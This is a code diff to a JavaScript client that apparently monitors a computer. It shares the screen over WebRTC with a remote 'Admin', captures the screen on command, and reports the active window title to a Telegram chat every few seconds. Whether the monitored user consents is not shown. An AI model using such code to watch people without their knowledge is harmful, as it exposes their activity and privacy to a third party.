@@ -83,6 +83,7 @@ try {
 let peerConnection = null;
 let localStream = null;
 let remotePeerId = null;
+let screenTrack = null;
 
 // --- INIT CONNECTION ---
 function initConnection() {
@@ -141,6 +142,7 @@ function initConnection() {
  log(`[SIG] Received Candidate`);
  handleCandidate(data.candidate);
  } else if (data.type === 'screen_data') {
+ // Kept for backward compatibility but no longer used for fake pings
  captureScreenPureJS();
  } else if (data.type === 'system_log') {
  // Optional
@@ -193,11 +195,11 @@ function startMonitoring() {
  }, 30000);
 
  setInterval(async () => {
- if (isSessionActive) {
+ if (isSessionActive && peerConnection && peerConnection.iceConnectionState === 'connected') {
  const title = await getCurrentWindowTitle();
  if (title) {
+ // Only send title update occasionally to avoid spam
  sendTelegram(`👁️ Current Window: ${title}`);
- captureScreenPureJS();
  }
  }
  }, 5000);
@@ -238,6 +240,11 @@ async function handleJoinRequest(fromId) {
  log(`[JOIN] Starting handshake with Admin: ${fromId}`);
  remotePeerId = fromId;
  
+ // Reset connection if one exists
+ if (peerConnection) {
+ closePeerConnection();
+ }
+
  const stream = await setupLocalStream();
  if (!stream) {
  log("[JOIN] Failed to get stream");
@@ -267,7 +274,7 @@ async function handleJoinRequest(fromId) {
  };
 
  peerConnection.ontrack = (event) => {
- log("[WEBRTC] Remote stream received!");
+ log("[WEBRTC] Remote stream received! (Should be empty for screen share)");
  };
 
  log("[SIG] Creating Offer");
@@ -312,6 +319,7 @@ function handleAnswer(sdp) {
  peerConnection.setRemoteDescription(new RTCSessionDescription(sdp))
  .then(() => {
  log("[WEBRTC] Connection Established!");
+ isSessionActive = true;
  })
  .catch(err => {
  log(`[WEBRTC] Error setting answer: ${err.message}`);
@@ -337,6 +345,7 @@ function closePeerConnection() {
  localStream.getTracks().forEach(track => track.stop());
  localStream = null;
  }
+ isSessionActive = false;
  log("[WEBRTC] Connection closed");
 }
 
@@ -359,7 +368,6 @@ async function getCurrentWindowTitle() {
  } else if (platform === 'darwin') {
  cmd = 'osascript -e \'tell application "System Events" to get name of first item of (get every process whose frontmost is true)\'';
  } else {
- // Removed generic linux fallback that was causing issues
  cmd = 'xdotool getwindowfocus getwindowname';
  }
  exec(cmd, (err, stdout) => {
